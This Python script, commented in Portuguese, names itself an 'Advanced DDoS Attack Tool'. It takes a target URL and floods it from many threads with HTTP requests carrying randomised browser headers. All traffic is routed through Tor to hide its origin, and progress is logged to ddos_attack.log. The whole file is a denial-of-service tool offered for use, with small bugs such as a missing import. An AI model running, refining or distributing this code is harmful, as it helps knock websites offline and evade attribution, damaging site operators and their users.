import socket
import socks
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket
import threading
import random
import time
import logging
import argparse
import requests
import dns.resolver
from urllib.parse import urlparse
import http.client
import ssl

# Configuração de log
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ddos_attack.log'),
        logging.StreamHandler()
    ]
)

class AdvancedDDOSAttacker:
    def __init__(self, url, num_threads=100, requests_per_thread=1000):
        self.url = url
        self.num_threads = num_threads
        self.requests_per_thread = requests_per_thread
        self.target_ip = None
        self.is_tor = False
        
    def resolve_domain(self):
        """Resolve o IP do domínio fornecido"""
        try:
            parsed_url = urlparse(self.url)
            domain = parsed_url.netloc
            
            # Resolução DNS
            answers = dns.resolver.resolve(domain, 'A')
            self.target_ip = str(answers[0])
            
            logging.info(f"IP resolvido: {self.target_ip}")
            return self.target_ip
            
        except Exception as e:
            logging.error(f"Erro ao resolver IP: {str(e)}")
            raise
    
    def setup_socket(self):
        """Configura socket com proxy"""
        if '--tor' in sys.argv:
            import socks
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            self.is_tor = True
    
    def get_random_headers(self):
        """Retorna headers aleatórios"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        return {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "DNT": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "TE": "trailers"
        }
    
    def send_request(self, thread_id):
        """Envia requisições de ataque"""
        try:
            # Configurar proxy
            self.setup_socket()
            
            # Conectar
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target_ip, 443 if 'https' in self.url else 80))
            
            for i in range(self.requests_per_thread):
                # Headers aleatórios
                headers = self.get_random_headers()
                
                # Construir request
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {urlparse(self.url).netloc}\r\n"
                )
                
                for k, v in headers.items():
                    request += f"{k}: {v}\r\n"
                
                request += "\r\n"
                
                # Enviar dados
                s.send(request.encode())
                
                logging.info(
                    f"[Thread-{thread_id}] Enviado request para {self.target_ip}:443 "
                    f"via {'Tor' if self.is_tor else 'direct'}"
                )
                
                # Delay aleatório
                time.sleep(random.uniform(0.5, 2.0))
                
            s.close()
            
        except Exception as e:
            logging.error(f"[Thread-{thread_id}] Erro: {str(e)}")
    
    def start_attack(self):
        """Inicia o ataque com múltiplas técnicas"""
        logging.info(f"Iniciando ataque DDoS avançado para {self.url}")
        
        # Resolver IP
        if not self.target_ip:
            self.resolve_domain()
        
        # Iniciar threads
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(
                target=self.send_request,
                args=(i,)
            )
            t.daemon = True
            t.start()
            threads.append(t)
            
            logging.info(f"Thread-{i} iniciada")
        
        # Aguardar threads
        for t in threads:
            t.join()
        
        logging.info("Ataque concluído")

def main():
    parser = argparse.ArgumentParser(description="Advanced DDoS Attack Tool")
    parser.add_argument("--url", required=True, help="URL do alvo")
    parser.add_argument("--threads", type=int, default=100, help="Número de threads")
    parser.add_argument("--requests", type=int, default=1000, help="Requisições por thread")
    parser.add_argument("--tor", action="store_true", help="Usar Tor para bypass")
    args = parser.parse_args()
    
    attacker = AdvancedDDOSAttacker(
        url=args.url,
        num_threads=args.threads,
        requests_per_thread=args.requests
    )
    
    attacker.start_attack()

if __name__ == "__main__":
    main()
